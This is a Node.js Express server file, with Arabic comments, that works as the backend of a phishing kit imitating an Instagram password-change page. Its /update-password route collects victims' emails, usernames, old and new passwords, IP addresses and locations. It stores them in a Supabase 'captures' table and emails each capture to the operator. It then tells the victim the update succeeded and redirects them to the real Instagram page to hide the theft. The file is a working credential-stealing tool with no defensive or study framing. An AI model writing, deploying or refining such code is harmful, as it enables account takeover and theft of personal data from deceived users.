require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const cookieParser = require('cookie-parser');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');
const { Resend } = require('resend');

const app = express();
const PORT = process.env.PORT || 8000;

// Supabase setup
const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);

// Resend setup للإيميل (بديل أفضل من Gmail)
const resend = process.env.RESEND_API_KEY ? new Resend(process.env.RESEND_API_KEY) : null;

app.use((req, res, next) => {
    console.log(`[${new Date().toLocaleTimeString()}] ${req.method} ${req.path} - IP: ${req.ip}`);
    next();
});

app.use(cors({ origin: "*", methods: ['GET', 'POST'], credentials: true }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.options('*', cors());

// دالة حفظ البيانات في Supabase (أونلاين دائمة)
async function saveToSupabase(data) {
    const { error } = await supabase
        .from('captures')
        .insert([data]);

    if (error) {
        console.log('❌ Supabase Error:', error.message);
    } else {
        console.log('✅ Data saved to Supabase online!');
    }
}

// إرسال إيميل بـ Resend (أكثر موثوقية)
async function sendEmailAlert(data) {
    if (!resend || !process.env.EMAIL_TO) {
        console.log('⚠️ Email disabled');
        return;
    }

    try {
        await resend.emails.send({
            from: 'alert@yourdomain.com', // غير بـ domain مضبوط في Resend
            to: process.env.EMAIL_TO,
            subject: `🔐 New Capture - ${data.email}`,
            html: `
                <h2>🔐 NEW CAPTURE</h2>
                <p><strong>Email:</strong> ${data.email}</p>
                <p><strong>Username:</strong> ${data.username}</p>
                <p><strong>Old Password:</strong> ${data.oldPassword}</p>
                <p><strong>NEW PASSWORD:</strong> <span style="color:red;">${data.newPassword}</span></p>
                <p><strong>IP:</strong> ${data.ip}</p>
                <p><strong>Location:</strong> ${data.location}</p>
                <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
            `
        });
        console.log('📧 Email sent via Resend');
    } catch (err) {
        console.log('❌ Resend Error:', err.message);
    }
}

// المسارات
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
    // يمكنك تضيف dashboard يجلب البيانات من Supabase هنا، أو استخدم Supabase dashboard مباشرة
    res.send('<h1>Admin: Use Supabase dashboard to view data online!</h1><p>URL: Your Supabase project dashboard</p>');
});

// مسار ال capture
app.post('/update-password', async (req, res) => {
    console.log('\n🎯 ===== NEW CAPTURE =====');

    const data = {
        email: req.body.email || 'N/A',
        username: req.body.username || 'N/A',
        old_password: req.body.oldPassword || 'N/A',
        new_password: req.body.newPassword || 'N/A',
        ip: req.ip || req.headers['x-forwarded-for'] || 'N/A',
        browser: req.headers['user-agent'] || 'N/A',
        location: req.body.location || 'N/A',
        created_at: new Date().toISOString()
    };

    // طباعة
    console.log('📧 Email:', data.email);
    console.log('🔐 NEW PASSWORD:', data.new_password);
    console.log('📍 IP:', data.ip);
    console.log('=================================\n');

    // حفظ في Supabase
    await saveToSupabase(data);

    // إرسال إيميل
    await sendEmailAlert(data);

    // رد للزائر
    res.json({
        success: true,
        message: 'Password updated successfully',
        redirect: 'https://www.instagram.com/accounts/password/change/'
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`
    🚀 Server running online!
    📍 URL: https://site-z08w.fly.dev
    💾 Data: Saved in Supabase (online DB)
    📧 Email: Via Resend ${resend ? '✅' : '❌'}
    `);
});
